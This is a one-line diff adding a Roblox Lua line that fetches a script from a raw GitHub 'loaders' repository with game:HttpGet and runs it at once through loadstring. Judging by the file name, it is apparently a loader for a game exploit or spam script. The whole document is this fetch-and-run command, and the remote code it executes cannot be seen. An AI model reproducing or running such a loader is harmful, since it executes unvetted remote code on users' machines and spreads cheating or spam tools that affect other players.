@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/blackbarbarianpush/loaders/main/loaders/baddies-spam4-v3c4w20dhgvcgm.lua"))()
